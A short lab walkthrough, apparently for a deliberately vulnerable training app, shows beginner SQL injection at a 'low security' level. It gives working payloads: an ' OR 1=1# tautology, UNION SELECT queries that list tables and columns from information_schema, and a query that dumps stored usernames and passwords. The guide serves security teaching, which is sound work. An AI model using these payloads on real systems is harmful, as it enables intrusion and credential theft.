🧨 SQL Injection – Low Security Level

### 🛠️ Objective:
Exploit SQL injection vulnerability in user ID lookup to extract database structure and credentials.

---

### 🧭 Walkthrough

1. Enter a number (e.g., `1`) in the input field.
   - You’ll see details for `user ID 1`.

2. Now enter a basic SQLi payload to bypass the logic:
   ```sql
   ' OR 1=1#
````

✅ Displays all user records — the query always returns true.

---

### 📊 Enumerating the Database

#### 🔎 Extract Table Names

```sql
' UNION SELECT table_name, null FROM information_schema.tables#
```

* ✅ Reveals available tables.
* Look for relevant tables like `users`.

#### 🔎 Extract Column Names

```sql
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'#
```

* ✅ Reveals column names: `id`, `user`, `password`, etc.

#### 🔐 Dump User Credentials

```sql
' UNION SELECT user, password FROM users#
```

* ✅ Retrieves all usernames and passwords stored in the `users` table.

---

### 🧩 Summary

* ❌ No input validation or sanitization
* ✅ Full SQL control from the input field
* 🟢 Very beginner-friendly

## ✅ Status

* ✅ Fully exploitable
* 🟢 Ideal for learning SQLi basics
